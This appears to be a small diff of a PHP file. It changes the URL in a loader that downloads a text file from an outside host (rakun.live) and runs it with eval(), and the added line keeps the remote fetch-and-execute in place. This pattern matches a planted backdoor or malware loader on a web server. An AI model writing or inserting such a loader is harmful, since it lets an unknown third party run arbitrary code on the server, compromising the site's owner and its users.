@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/mrjdu.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/mjedu.txt'));
 $url = "?> ".$url;
 eval($url);
 
